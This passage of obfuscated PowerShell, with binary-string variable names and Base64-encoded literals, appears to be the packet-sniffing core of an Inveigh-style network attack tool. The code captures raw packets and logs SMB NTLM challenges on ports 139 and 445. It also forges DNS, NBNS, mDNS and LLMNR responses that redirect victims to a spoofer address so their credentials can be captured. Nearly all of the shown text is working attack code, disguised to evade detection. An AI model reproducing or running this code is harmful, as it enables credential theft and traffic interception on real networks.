                ${10000101011100101}.Write(${10101110011000100},0,${10101110011000100}.Count)
            }
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
            $Pcap = ''
        }
    }
    elseif($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AbwByAHkA'))) -and !${00101000010000101}.pcap)
    {
        ${00101000010000101}.pcap = New-Object System.Collections.ArrayList
        ${00101000010000101}.pcap.AddRange(${10101110011000100})
    }
    while(${00101000010000101}.running -and ${00001110001000011})
    {
        ${01001101000111010} = ${01101010010011100}.Receive(${01011100000011010},0,${01011100000011010}.Length,[System.Net.Sockets.SocketFlags]::None)
        ${00111110110001001} = New-Object System.IO.MemoryStream(${01011100000011010},0,${01001101000111010})
        ${00110011001110100} = New-Object System.IO.BinaryReader(${00111110110001001})
        ${01111000000111100} = ${00110011001110100}.ReadByte()
        ${00110011001110100}.ReadByte() > $null
        ${00000101000000010} = _01111101011010101 ${00110011001110100}.ReadBytes(2)
        ${00110011001110100}.ReadBytes(5) > $null
        ${10001100100011011} = ${00110011001110100}.ReadByte()
        ${00110011001110100}.ReadBytes(2) > $null
        ${01100110001001111} = ${00110011001110100}.ReadBytes(4)
        ${10100011000000011} = [System.Net.IPAddress]${01100110001001111}
        ${00011001110100100} = ${00110011001110100}.ReadBytes(4)
        ${10101101011010000} = [System.Net.IPAddress]${00011001110100100}
        ${00001011011000100} = [Int]"0x$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${01111000000111100})[1])" * 4
        switch(${10001100100011011})
        {
            6 
            {  
                ${10101010011001111} = _01111101011010101 ${00110011001110100}.ReadBytes(2)
                ${00010000111011110} = _01111101011010101 ${00110011001110100}.ReadBytes(2)
                ${00110011001110100}.ReadBytes(8) > $null
                ${01000010111101100} = [Int]"0x$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${00110011001110100}.ReadByte())[0])" * 4
                ${10000101101000000} = ${00110011001110100}.ReadByte()
                ${00110011001110100}.ReadBytes(${01000010111101100} - 14) > $null
                ${01000111011000011} = ${00110011001110100}.ReadBytes(${01001101000111010})
                ${10000101101000000} = ([convert]::ToString(${10000101101000000},2)).PadLeft(8,"0")
                if(${10000101101000000}.SubString(6,1) -eq "1" -and ${10000101101000000}.SubString(3,1) -eq "0" -and ${10101101011010000} -eq $IP)
                {
                    ${00110000010111110} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA==')))
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] TCP(${00010000111011110}) SYN packet detected from ${00110000010111110}") > $null
                }
                switch (${00010000111011110})
                {
                    139 
                    {
                        if(${01000111011000011})
                        {
                            _01001010110001110 ${01000111011000011} $IP ${10100011000000011} ${10101101011010000} ${10101010011001111} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAzADkA')))
                        }
                        if(${00101000010000101}.SMB_session_table.ContainsKey($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA==')))))
                        {
                            _10100001000011001 ${01000111011000011} $SMB ${10100011000000011} ${10101010011001111} 139 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIA')))
                        }
                    }
                    445
                    {
                        if(${00111011110001011}.Count -lt ${10100101010011111} -and $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA=='))) -eq ${01100001001101011})
                        {
                            ${00111011110001011} += ${01000111011000011}
                            if(${00111011110001011}.Count -ge ${10100101010011111})
                            {
                                _00111110011100111 ${00111011110001011} ${01110001010011111} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIA'))) 445 $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA==')))
                                ${10100101010011111} = $null
                                ${00111011110001011} = $null
                                ${01100001001101011} = $null
                            }
                        }
                        if(${01000111011000011})
                        {   
                            ${00011001011000110} = _01001010110001110 ${01000111011000011} $IP ${10100011000000011} ${10101101011010000} ${10101010011001111} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA')))
                            ${10100101010011111} = ${00011001011000110}[0]
                            ${00111011110001011} = ${00011001011000110}[1]
                            ${01100001001101011} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA==')))
                        }
                        if(${00101000010000101}.SMB_session_table.ContainsKey($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMAAwADEAMQAwADAAMAAwADAAMAAwADEAMQB9ADoAJAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAwADAAMQAxADEAMQB9AA==')))))
                        {
                            _10100001000011001 ${01000111011000011} $SMB ${10100011000000011} ${10101010011001111} 445 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIA')))
                        }
                    }
                }
                switch (${10101010011001111})
                {
                    139 
                    {
                        if(${01000111011000011})
                        {
                            ${10011110101000110} = _10011100000101000 ${01000111011000011}
                        }
                        if(${10011110101000110} -and ${10101101011010000} -ne ${10100011000000011})
                        {
                            if(${10100011000000011} -eq $IP)
                            {
                                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge ${10011110101000110} sent to ${10101101011010000}`:${00010000111011110}") > $null
                            }
                            else
                            {
                                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge ${10011110101000110} received from ${10101101011010000}`:${00010000111011110}") > $null
                            }
                            ${00101000010000101}.SMB_session_table."${10101101011010000}`:${00010000111011110}" = ${10011110101000110}
                            ${10011110101000110} = $null
                        }
                    }
                    445
                    {
                        if(${01000111011000011})
                        {
                            ${10011110101000110} = _10011100000101000 ${01000111011000011}
                        }
                        if(${10011110101000110} -and ${10101101011010000} -ne ${10100011000000011})
                        {
                            if(${10100011000000011} -eq $IP)
                            {
                                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge ${10011110101000110} sent to ${10101101011010000}`:${00010000111011110}") > $null
                            }
                            else
                            {
                                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge ${10011110101000110} received from ${10101101011010000}`:${00010000111011110}") > $null
                            }
                            ${00101000010000101}.SMB_session_table."${10101101011010000}`:${00010000111011110}" = ${10011110101000110}                      
                            ${10011110101000110} = $null
                        }
                    }
                }
                if($Pcap -and ($PcapTCP -contains ${10101010011001111} -or $PcapTCP -contains ${00010000111011110} -or $PcapTCP -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))))
                {
                    if(${01000111011000011})
                    {
                        ${00010000010001001} = ([datetime]::UtcNow)-(Get-Date $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAvADEALwAxADkANwAwAA=='))))
                        ${10011000010010011} = [System.BitConverter]::GetBytes(${01001101000111010} + 14)
                        ${01100110111010111} = [System.BitConverter]::GetBytes([Int][Math]::Truncate(${00010000010001001}.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes(${00010000010001001}.Milliseconds) + 
                            ${10011000010010011} +
                            ${10011000010010011} +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            ${01011100000011010}[0..(${01001101000111010} - 1)]
                        if(${01100110111010111}.Count -eq (${01001101000111010} + 30))
                        {
                            switch ($Pcap)
                            {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA=')))
                                {
                                    try
                                    {
                                        ${10000101011100101}.Write(${01100110111010111},0,${01100110111010111}.Count)    
                                    }
                                    catch
                                    {
                                        ${01100011111101101} = $_.Exception.Message
                                        ${01100011111101101} = ${01100011111101101} -replace "`n",""
                                        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AbwByAHkA')))
                                {
                                    ${00101000010000101}.pcap.AddRange(${01100110111010111}) 
                                }
                            }
                        }
                    }
                }
            }
            17 
            {  
                ${10101010011001111} = ${00110011001110100}.ReadBytes(2)
                ${10010100010000001} = _01111101011010101 (${10101010011001111})
                ${00010000111011110} = _01111101011010101 ${00110011001110100}.ReadBytes(2)
                ${00011000111000001} = ${00110011001110100}.ReadBytes(2)
                ${00100100011010101}  = _01111101011010101 (${00011000111000001})
                ${00110011001110100}.ReadBytes(2) > $null
                ${01000111011000011} = ${00110011001110100}.ReadBytes((${00100100011010101} - 2) * 4)
                switch(${00010000111011110})
                {
                    53 
                    {
                        ${00111000011001100} = _01011111100111001 12 ${01000111011000011}
                        ${01010000111011000} = ${01000111011000011}[12..(${00111000011001100}.Length + 13)]
                        [Byte[]]${00011000111000001} = ([System.BitConverter]::GetBytes(${01010000111011000}.Count + ${01010000111011000}.Count + $SpooferIP.Length + 23))[1,0]
                        ${10011011000100010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
                        ${01010000111011000} += 0x00,0x01,0x00,0x01 +
                                                ${01010000111011000} +
                                                0x00,0x01,0x00,0x01 +
                                                ${10100001110100100} +
                                                0x00,0x04 +
                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                        ${00111011011101010} = 0x00,0x35 +
                                                    ${10101010011001111}[1,0] +
                                                    ${00011000111000001} +
                                                    0x00,0x00 +
                                                    ${01000111011000011}[0,1] +
                                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${01010000111011000}
                        ${00011111000001001} = _00011011100101100 -_01000110101110010 ${00111000011001100} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMA'))) -_10101011010010001 $DNS
                        ${10011011000100010} = ${00011111000001001}[0]
                        ${00011111000001001} = ${00011111000001001}[1]
                        if(${00011111000001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
                        {
                            ${00011100001000000} = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                            ${00011100001000000}.SendBufferSize = 1024
                            ${01110100100110000} = New-Object System.Net.IPEndpoint(${10100011000000011},${10010100010000001}) 
                            ${00011100001000000}.SendTo(${00111011011101010},${01110100100110000}) > $null
                            ${00011100001000000}.Close()
                        }
                        if(${10101101011010000} -eq $IP)
                        {
                            ${00101000010000101}.output_queue.Add("${10011011000100010} [$(Get-Date -format s)] DNS request for ${00111000011001100} received from ${10100011000000011} ${00011111000001001}") > $null
                        }
                        else
                        {
                            ${00101000010000101}.output_queue.Add("${10011011000100010} [$(Get-Date -format s)] DNS request for ${00111000011001100} sent to ${10101101011010000} [outgoing query]") > $null
                        }
                    }
                    137 
                    {
                        if(([System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAA=='))) -or [System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAxAA==')))) -and [System.BitConverter]::ToString(${01000111011000011}[10..11]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAA=='))))
                        {
                            if([System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                            {
                                ${00011000111000001}[0] += 12
                                ${01001010100100111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
                                ${01101000000111010} = ${01000111011000011}[13..${01000111011000011}.Length] +
                                                        ${01101101001000011} +
                                                        0x00,0x06,0x00,0x00 +
                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                                ${01000010100010010} = 0x00,0x89 +
                                                        ${10101010011001111}[1,0] +
                                                        ${00011000111000001}[1,0] +
                                                        0x00,0x00 +
                                                        ${01000111011000011}[0,1] +
                                                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                        ${01101000000111010}
                                ${01110100101111101} = [System.BitConverter]::ToString(${01000111011000011}[43..44])
                                ${01110100101111101} = _01110000001101110 ${01110100101111101}
                                ${01010100101011110} = ${01000111011000011}[47]
                                ${10011011111100110} = [System.BitConverter]::ToString(${01000111011000011}[13..(${01000111011000011}.Length - 4)])
                                ${10011011111100110} = ${10011011111100110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                                ${10011011111100110} = ${10011011111100110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                                ${00111101101110100} = New-Object System.String (${10011011111100110},0,${10011011111100110}.Length)
                                ${01010110110100000} = ${00111101101110100}
                                ${00111101101110100} = ${00111101101110100}.Substring(0,${00111101101110100}.IndexOf("CA"))                
                                ${00101100110111110} = $null
                                ${01101100010000010} = $null
                                ${10110111111001011} = 0
                                do
                                {
                                    ${01111101111001110} = (([Byte][Char](${00111101101110100}.Substring(${10110111111001011},1))) - 65)
                                    ${00101100110111110} += ([System.Convert]::ToString(${01111101111001110},16))
                                    ${10110111111001011}++
                                }
                                until(${10110111111001011} -ge (${00111101101110100}.Length))
                                ${10110111111001011} = 0
                                do
                                {
                                    ${01101100010000010} += ([Char]([System.Convert]::ToInt16(${00101100110111110}.Substring(${10110111111001011},2),16)))
                                    ${10110111111001011} += 2
                                }
                                until(${10110111111001011} -ge (${00101100110111110}.Length) -or ${01101100010000010}.Length -eq 15)
                                if(${01010110110100000}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBCAEEAQwA=')))) -and ${01010110110100000}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEEAQgA=')))))
                                {
                                    ${01101100010000010} = ${01101100010000010}.Substring(2)
                                    ${01101100010000010} = ${01101100010000010}.Substring(0, ${01101100010000010}.Length - 1)
                                    ${01101100010000010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAwADEAPgA8ADAAMgA+AA=='))) + ${01101100010000010} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAwADIAPgA=')))
                                }
                                if(${01101100010000010} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAwADAALQBcAHgANwBGAF0AKwA='))))
                                {
                                    if(!${00101000010000101}.request_table.ContainsKey(${01101100010000010}))
                                    {
                                        ${00101000010000101}.request_table.Add(${01101100010000010}.ToLower(),[Array]${10100011000000011}.IPAddressToString)
                                        ${00101000010000101}.request_table_updated = $true
                                    }
                                    else
                                    {
                                        ${00101000010000101}.request_table.${01101100010000010} += ${10100011000000011}.IPAddressToString
                                        ${00101000010000101}.request_table_updated = $true
                                    }
                                }
                                ${00000110010101010} = $false
                            }
                            if($SpooferLearning -eq 'Y' -and ${00101000010000101}.valid_host_list -notcontains ${01101100010000010} -and [System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAA=='))) -and ${10100011000000011} -ne $IP)
                            {
                                if((${00011011101111000}.Exists({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMAAxADEAMAAwADAAMQAwADAAMAAwADAAMQAwAH0A')))})))
                                {
                                    ${00111011011110001} = [DateTime]${00011011101111000}.Find({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMAAxADEAMAAwADAAMQAwADAAMAAwADAAMQAwAH0A')))}).SubString(0,19)
                                    if((Get-Date) -ge ${00111011011110001}.AddMinutes($SpooferLearningInterval))
                                    {
                                        ${00011011101111000}.RemoveAt(${00011011101111000}.FindIndex({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMAAxADEAMAAwADAAMQAwADAAMAAwADAAMQAwAH0A')))}))
                                        ${01000101100100111} = $true
                                    }
                                    else
                                    {
                                        ${01000101100100111} = $false
                                    }
                                }
                                else
                                {           
                                    ${01000101100100111} = $true
                                }
                                if(${01000101100100111})
                                {
                                    ${01110011111110000} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
                                    ${00001001000100001} = ${01110011111110000}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
                                    ${01110011111110000} = ${01110011111110000} -replace " ","-"
                                    ${01110000000000111} = New-Object System.Net.Sockets.UdpClient 137
                                    ${00100101101111101} = ${01000111011000011}[13..(${01000111011000011}.Length - 5)]
                                    ${10010000111001110} = ${00001001000100001} +
                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                            ${00100101101111101} +
                                                            0x00,0x20,0x00,0x01
                                    ${10101100011001100} = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                    ${01110000000000111}.Connect(${10101100011001100})
                                    ${01110000000000111}.Send(${10010000111001110},${10010000111001110}.Length)
                                    ${01110000000000111}.Close()
                                    ${00011011101111000}.Add("$(Get-Date -format s) ${01110011111110000} ${01101100010000010}") > $null
                                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request ${01101100010000010} sent to " + ${10101100011001100}.Address.IPAddressToString) > $null
                                }
                            }
                            ${10101000000110001} = _00011011100101100 -_01000110101110010 ${01101100010000010} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA='))) -_10101011010010001 $NBNS -_10111010100100110 ${01010100101011110}
                            ${01001010100100111} = ${10101000000110001}[0]
                            ${10101000000110001} = ${10101000000110001}[1]
                            if(${10101000000110001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
                            {
                                if($SpooferLearning -eq 'N' -or !${00011011101111000}.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString(${01000111011000011}[0..1]) + " *"}))
                                {
                                    ${01001011110011001} = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    ${01001011110011001}.SendBufferSize = 1024
                                    ${01101010100011110} = New-Object Net.IPEndpoint(${10100011000000011},${10010100010000001})
                                    ${01001011110011001}.SendTo(${01000010100010010},${01101010100011110}) > $null
                                    ${01001011110011001}.Close()
                                }
                                else
                                {
                                    ${00000110010101010} = $true
                                }
                            }
                            else
                            {
                                if(${10100011000000011} -eq $IP -and ${00011011101111000}.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString(${01000111011000011}[0..1]) + " *"}))
                                {
                                    ${00000110010101010} = $true
                                }
                            }
                            if(!${00000110010101010} -and [System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                            {
                                ${00101000010000101}.output_queue.Add("${01001010100100111} [$(Get-Date -format s)] NBNS request for ${01101100010000010}<${01110100101111101}> received from ${10100011000000011} ${10101000000110001}") > $null
                            }
                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString(${01000111011000011}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAxAA=='))) -and ${00011011101111000}.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString(${01000111011000011}[0..1]) + " *"}))
                            {
                                [Byte[]]${00101101110111000} = ${01000111011000011}[(${01000111011000011}.Length - 4)..(${01000111011000011}.Length)]
                                ${10101001000010100} = [System.Net.IPAddress]${00101101110111000}
                                ${10101001000010100} = ${10101001000010100}.IPAddressToString
                                if(${00101000010000101}.valid_host_list -notcontains ${01101100010000010})
                                {
                                    ${00101000010000101}.valid_host_list.Add(${01101100010000010}) > $null
                                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response ${10101001000010100} for ${01101100010000010} received from ${10100011000000011} [added to valid host list]") > $null
                                }
                            }
                        }
                    }
                    5353 
                    {   
                        if(([System.BitConverter]::ToString(${01000111011000011})).EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADEALQA4ADAALQAwADEA')))) -and [System.BitConverter]::ToString(${01000111011000011}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${00011000111000001}[0] += 10
                            ${00100110001010010} = _01011111100111001 12 ${01000111011000011}
                            ${00001001111011001} = ${01000111011000011}[12..(${00100110001010010}.Length + 13)]
                            ${10110111010110011} = (${00100110001010010}.Split("."))[0]
                            ${00011000111000001}[0] = ${00001001111011001}.Count + $SpooferIP.Length + 23
                            ${00100100011010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
                            ${01110101000000010} = ${00001001111011001} +
                                                    0x00,0x01,0x00,0x01 +
                                                    ${00100001011001001} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                            ${00011100111011101} = 0x14,0xe9 +
                                                    ${10101010011001111}[1,0] +
                                                    ${00011000111000001}[1,0] +
                                                    0x00,0x00 +
                                                    ${01000111011000011}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${01110101000000010}
                            ${01001100000100101} = _00011011100101100 -_01000110101110010 ${10110111010110011}  -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -_10110000100111011 "QU" -_10101011010010001 $mDNS
                            ${00100100011010011} = ${01001100000100101}[0]
                            ${01001100000100101} = ${01001100000100101}[1]
                            if(${01001100000100101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
                            {
                                ${00100111111000001} = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                ${00100111111000001}.SendBufferSize = 1024
                                ${01101000001111001} = New-Object System.Net.IPEndpoint(${10100011000000011},${10010100010000001})
                                ${00100111111000001}.SendTo(${00011100111011101},${01101000001111001}) > $null
                                ${00100111111000001}.Close()
                            }
                            ${00101000010000101}.output_queue.Add("${00100100011010011} [$(Get-Date -format s)] mDNS(QU) request ${00100110001010010} received from ${10100011000000011} ${01001100000100101}") > $null
                        }
                        elseif(([System.BitConverter]::ToString(${01000111011000011})).EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADEA')))) -and ([System.BitConverter]::ToString(
                            ${01000111011000011}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -or [System.BitConverter]::ToString(${01000111011000011}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAyAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                        {
                            ${00100110001010010} = _01011111100111001 12 ${01000111011000011}
                            ${00001001111011001} = ${01000111011000011}[12..(${00100110001010010}.Length + 13)]
                            ${10110111010110011} = (${00100110001010010}.Split("."))[0]
                            ${00011000111000001}[0] = ${00001001111011001}.Count + $SpooferIP.Length + 23
                            ${00100100011010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
                            ${01110101000000010} = ${00001001111011001} +
                                                    0x00,0x01,0x80,0x01 +
                                                    ${00100001011001001} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                            ${00011100111011101} = 0x14,0xe9 +
                                                    ${10101010011001111}[1,0] +
                                                    ${00011000111000001}[1,0] +
                                                    0x00,0x00 +
                                                    ${01000111011000011}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${01110101000000010}
                            ${01001100000100101} = _00011011100101100 -_01000110101110010 ${10110111010110011}  -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -_10110000100111011 "QM" -_10101011010010001 $mDNS
                            ${00100100011010011} = ${01001100000100101}[0]
                            ${01001100000100101} = ${01001100000100101}[1]
                            if(${01001100000100101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
                            {
                                ${00100111111000001} = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                ${00100111111000001}.SendBufferSize = 1024
                                ${01101000001111001} = New-Object System.Net.IPEndpoint([IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA=='))),5353)
                                ${00100111111000001}.SendTo(${00011100111011101},${01101000001111001}) > $null
                                ${00100111111000001}.Close()
                            }
                            ${00101000010000101}.output_queue.Add("${00100100011010011} [$(Get-Date -format s)] mDNS(QM) request ${00100110001010010} received from ${10100011000000011} ${01001100000100101}") > $null
                        }
                    }
                    5355 
                    {
                        if([System.BitConverter]::ToString(${01000111011000011}[(${01000111011000011}.Length - 4)..(${01000111011000011}.Length - 3)]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMQBjAA==')))) 
                        {
                            ${00011000111000001}[0] += ${01000111011000011}.Length - 2
                            ${10011101101000110} = ${01000111011000011}[12..${01000111011000011}.Length]
                            ${01111011111100001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
                            ${10011101101000110} += ${10011101101000110} +
                                                    ${00110011000000110} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                            ${01001111011111001} = 0x14,0xeb +
                                                        ${10101010011001111}[1,0] +
                                                        ${00011000111000001}[1,0] +
                                                        0x00,0x00 +
                                                        ${01000111011000011}[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        ${10011101101000110}
                            ${01111101000101111} = [System.Text.Encoding]::UTF8.GetString(${01000111011000011}[13..(${01000111011000011}.Length - 4)]) -replace "`0",""
                            if(!${00101000010000101}.request_table.ContainsKey(${01111101000101111}))
                            {
                                ${00101000010000101}.request_table.Add(${01111101000101111}.ToLower(),[Array]${10100011000000011}.IPAddressToString)
                                ${00101000010000101}.request_table_updated = $true
                            }
                            else
                            {
                                ${00101000010000101}.request_table.${01111101000101111} += ${10100011000000011}.IPAddressToString
                                ${00101000010000101}.request_table_updated = $true
                            }
                            ${00001000111000111} = $false
                            if($SpooferLearning -eq 'Y' -and ${00101000010000101}.valid_host_list -notcontains ${01111101000101111} -and ${10100011000000011} -ne $IP)
                            {
